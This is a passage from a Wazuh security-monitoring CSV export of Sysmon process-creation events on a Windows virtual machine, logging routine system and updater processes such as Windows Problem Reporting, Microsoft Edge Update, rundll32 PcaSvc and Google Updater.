MD5=250C58FBA93500526A03D5B526E48B3C,SHA256=284F38524C26F39B1DD788210E7310C8DF99EFE8A420A031DC42247E75FC646E,IMPHASH=69C608216376CA2D62C0C27FB0B423E6\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:42.818"",""processGuid"":""{154c2aaf-ea36-6846-2101-000000001800}"",""processId"":""2272"",""image"":""C:\\\\Windows\\\\System32\\\\wermgr.exe"",""fileVersion"":""10.0.19041.5794 (WinBuild.160101.0800)"",""description"":""Windows Problem Reporting"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""WerMgr"",""commandLine"":""\\\""C:\\\\Windows\\\\system32\\\\wermgr.exe\\\"" -upload"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=250C58FBA93500526A03D5B526E48B3C,SHA256=284F38524C26F39B1DD788210E7310C8DF99EFE8A420A031DC42247E75FC646E,IMPHASH=69C608216376CA2D62C0C27FB0B423E6"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.251",EventChannel,1749477944.1009039,"Jun 9, 2025 @ 19:35:44.251", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,a-ADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,msedgeupdate.dll,C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe,Microsoft Edge Update,{154c2aaf-e982-6846-1900-000000001800},Microsoft Edge Update,{154c2aaf-e981-6846-e703-000000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ea36-6846-2a01-000000001800},0x3e7,1168,3004,C:\\Windows\\system32\\,2025-06-09 14:05:42.860,"MD5=C019E421D9F897108E51666CBAE2C8B0,SHA256=3096D8E82917A9B73F322F4B1743E52E9B0C8B3C5933A957E73E29D6973CDD5B,IMPHASH=E00D60405A249A05D3B09AA7FE924B17",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,"\""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource scheduler",System,1.3.147.37,NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:42.860
ProcessGuid: {154c2aaf-ea36-6846-2a01-000000001800}
ProcessId: 3004
Image: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
FileVersion: 1.3.147.37
Description: Microsoft Edge Update
Product: Microsoft Edge Update
Company: Microsoft Corporation
OriginalFileName: msedgeupdate.dll
CommandLine: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /ua /installsource scheduler
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=C019E421D9F897108E51666CBAE2C8B0,SHA256=3096D8E82917A9B73F322F4B1743E52E9B0C8B3C5933A957E73E29D6973CDD5B,IMPHASH=E00D60405A249A05D3B09AA7FE924B17
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:42.8810166Z,30722,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,8,false,5,Sysmon - Event 1: Process creation Microsoft Edge Update,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:42.8810166Z"",""eventRecordID"":""30722"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:42.860\r\nProcessGuid: {154c2aaf-ea36-6846-2a01-000000001800}\r\nProcessId: 3004\r\nImage: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\r\nFileVersion: 1.3.147.37\r\nDescription: Microsoft Edge Update\r\nProduct: Microsoft Edge Update\r\nCompany: Microsoft Corporation\r\nOriginalFileName: msedgeupdate.dll\r\nCommandLine: \""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource scheduler\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=C019E421D9F897108E51666CBAE2C8B0,SHA256=3096D8E82917A9B73F322F4B1743E52E9B0C8B3C5933A957E73E29D6973CDD5B,IMPHASH=E00D60405A249A05D3B09AA7FE924B17\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:42.860"",""processGuid"":""{154c2aaf-ea36-6846-2a01-000000001800}"",""processId"":""3004"",""image"":""C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe"",""fileVersion"":""1.3.147.37"",""description"":""Microsoft Edge Update"",""product"":""Microsoft Edge Update"",""company"":""Microsoft Corporation"",""originalFileName"":""msedgeupdate.dll"",""commandLine"":""\\\""C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\MicrosoftEdgeUpdate.exe\\\"" /ua /installsource scheduler"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=C019E421D9F897108E51666CBAE2C8B0,SHA256=3096D8E82917A9B73F322F4B1743E52E9B0C8B3C5933A957E73E29D6973CDD5B,IMPHASH=E00D60405A249A05D3B09AA7FE924B17"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.282",EventChannel,1749477944.1020402,"Jun 9, 2025 @ 19:35:44.282", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,bOADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,RUNDLL32.EXE,C:\\Windows\\System32\\rundll32.exe,Microsoft® Windows® Operating System,{154c2aaf-e982-6846-1900-000000001800},Windows host process (Rundll32),{154c2aaf-e981-6846-e703-000000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ea36-6846-2c01-000000001800},0x3e7,1168,3040,C:\\Windows\\system32\\,2025-06-09 14:05:42.865,"MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,"\""C:\\Windows\\system32\\rundll32.exe\"" C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask",System,10.0.19041.5794 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:42.865
ProcessGuid: {154c2aaf-ea36-6846-2c01-000000001800}
ProcessId: 3040
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\PcaSvc.dll,PcaPatchSdbTask
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:42.8815532Z,30723,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,9,false,5,Sysmon - Event 1: Process creation Windows host process (Rundll32),"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:42.8815532Z"",""eventRecordID"":""30723"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:42.865\r\nProcessGuid: {154c2aaf-ea36-6846-2c01-000000001800}\r\nProcessId: 3040\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nFileVersion: 10.0.19041.5794 (WinBuild.160101.0800)\r\nDescription: Windows host process (Rundll32)\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: RUNDLL32.EXE\r\nCommandLine: \""C:\\Windows\\system32\\rundll32.exe\"" C:\\Windows\\system32\\PcaSvc.dll,PcaPatchSdbTask\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:42.865"",""processGuid"":""{154c2aaf-ea36-6846-2c01-000000001800}"",""processId"":""3040"",""image"":""C:\\\\Windows\\\\System32\\\\rundll32.exe"",""fileVersion"":""10.0.19041.5794 (WinBuild.160101.0800)"",""description"":""Windows host process (Rundll32)"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""RUNDLL32.EXE"",""commandLine"":""\\\""C:\\\\Windows\\\\system32\\\\rundll32.exe\\\"" C:\\\\Windows\\\\system32\\\\PcaSvc.dll,PcaPatchSdbTask"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.282",EventChannel,1749477944.1026279,"Jun 9, 2025 @ 19:35:44.282", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,c-ADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,updater.exe,C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe,Google Updater (x86),{154c2aaf-ea36-6846-2401-000000001800},Google Updater (x86),{154c2aaf-e981-6846-e703-000000000000},"\""C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe\"" --wake --system",{154c2aaf-ea37-6846-3501-000000001800},0x3e7,2408,7036,C:\\Windows\\system32\\,2025-06-09 14:05:43.330,"MD5=A1044445F76098186DE3B146ABDA9876,SHA256=8CA4F944172F0904B4D70E40A5D61B54439109502E7E3E20D71F8A83BEAD9CE8,IMPHASH=9888642409BEC5969301F0CDEA998BD2",C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe,Google LLC,"\""C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe\"" --crash-handler --system \""--database=C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\Crashpad\"" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7194.0 \""--attachment=C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.log\"" --initial-client-data=0x2a0,0x2a4,0x2a8,0x27c,0x2ac,0xe529c0,0xe529cc,0xe529d8",System,138.0.7194.0,NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:43.330
ProcessGuid: {154c2aaf-ea37-6846-3501-000000001800}
ProcessId: 7036
Image: C:\Program Files (x86)\Google\GoogleUpdater\138.0.7194.0\updater.exe
FileVersion: 138.0.7194.0
Description: Google Updater (x86)
Product: Google Updater (x86)
Company: Google LLC
OriginalFileName: updater.exe
CommandLine: ""C:\Program Files (x86)\Google\GoogleUpdater\138.0.7194.0\updater.exe"" --crash-handler --system ""--database=C:\Program Files (x86)\Google\GoogleUpdater\138.0.7194.0\Crashpad"" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7194.0 ""--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log"" --initial-client-data=0x2a0,0x2a4,0x2a8,0x27c,0x2ac,0xe529c0,0xe529cc,0xe529d8
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=A1044445F76098186DE3B146ABDA9876,SHA256=8CA4F944172F0904B4D70E40A5D61B54439109502E7E3E20D71F8A83BEAD9CE8,IMPHASH=9888642409BEC5969301F0CDEA998BD2
ParentProcessGuid: {154c2aaf-ea36-6846-2401-000000001800}
ParentProcessId: 2408
ParentImage: C:\Program Files (x86)\Google\GoogleUpdater\138.0.7194.0\updater.exe
ParentCommandLine: ""C:\Program Files (x86)\Google\GoogleUpdater\138.0.7194.0\updater.exe"" --wake --system
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:43.4542058Z,30730,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,16,false,5,Sysmon - Event 1: Process creation Google Updater (x86),"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:43.4542058Z"",""eventRecordID"":""30730"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:43.330\r\nProcessGuid: {154c2aaf-ea37-6846-3501-000000001800}\r\nProcessId: 7036\r\nImage: C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe\r\nFileVersion: 138.0.7194.0\r\nDescription: Google Updater (x86)\r\nProduct: Google Updater (x86)\r\nCompany: Google LLC\r\nOriginalFileName: updater.exe\r\nCommandLine: \""C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe\"" --crash-handler --system \""--database=C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\Crashpad\"" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7194.0 \""--attachment=C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.log\"" --initial-client-data=0x2a0,0x2a4,0x2a8,0x27c,0x2ac,0xe529c0,0xe529cc,0xe529d8\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=A1044445F76098186DE3B146ABDA9876,SHA256=8CA4F944172F0904B4D70E40A5D61B54439109502E7E3E20D71F8A83BEAD9CE8,IMPHASH=9888642409BEC5969301F0CDEA998BD2\r\nParentProcessGuid: {154c2aaf-ea36-6846-2401-000000001800}\r\nParentProcessId: 2408\r\nParentImage: C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe\r\nParentCommandLine: \""C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe\"" --wake --system\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:43.330"",""processGuid"":""{154c2aaf-ea37-6846-3501-000000001800}"",""processId"":""7036"",""image"":""C:\\\\Program Files (x86)\\\\Google\\\\GoogleUpdater\\\\138.0.7194.0\\\\updater.exe"",""fileVersion"":""138.0.7194.0"",""description"":""Google Updater (x86)"",""product"":""Google Updater (x86)"",""company"":""Google LLC"",""originalFileName"":""updater.exe"",""commandLine"":""\\\""C:\\\\Program Files (x86)\\\\Google\\\\GoogleUpdater\\\\138.0.7194.0\\\\updater.exe\\\"" --crash-handler --system \\\""--database=C:\\\\Program Files (x86)\\\\Google\\\\GoogleUpdater\\\\138.0.7194.0\\\\Crashpad\\\"" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=138.0.7194.0 \\\""--attachment=C:\\\\Program Files (x86)\\\\Google\\\\GoogleUpdater\\\\updater.log\\\"" --initial-client-data=0x2a0,0x2a4,0x2a8,0x27c,0x2ac,0xe529c0,0xe529cc,0xe529d8"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=A1044445F76098186DE3B146ABDA9876,SHA256=8CA4F944172F0904B4D70E40A5D61B54439109502E7E3E20D71F8A83BEAD9CE8,IMPHASH=9888642409BEC5969301F0CDEA998BD2"",""parentProcessGuid"":""{154c2aaf-ea36-6846-2401-000000001800}"",""parentProcessId"":""2408"",""parentImage"":""C:\\\\Program Files (x86)\\\\Google\\\\GoogleUpdater\\\\138.0.7194.0\\\\updater.exe"",""parentCommandLine"":""\\\""C:\\\\Program Files (x86)\\\\Google\\\\GoogleUpdater\\\\138.0.7194.0\\\\updater.exe\\\"" --wake --system"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.408",EventChannel,1749477944.1066932,"Jun 9, 2025 @ 19:35:44.408", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
